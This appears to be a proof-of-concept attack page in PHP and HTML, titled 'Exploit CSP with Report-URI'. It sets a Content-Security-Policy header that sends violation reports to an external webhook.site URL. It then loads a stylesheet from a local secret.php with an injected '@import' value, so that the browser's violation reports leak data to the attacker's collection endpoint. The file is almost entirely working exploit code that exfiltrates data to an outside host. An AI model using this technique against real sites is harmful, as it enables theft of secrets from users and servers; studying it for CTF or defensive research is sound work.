<?php

header("Content-Security-Policy: style-src http://localhost:8889/secret.php; report-uri https://webhook.site/97b703dc-c969-485e-85f9-14fe8881d298;");


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit CSP with Report-URI</title>
    <link rel="stylesheet" href="http://localhost:8889/secret.php?whatUwant=@import '">
</head>
<body>
    <h1>Exploitation in Progress...</h1>
</body>
</html>
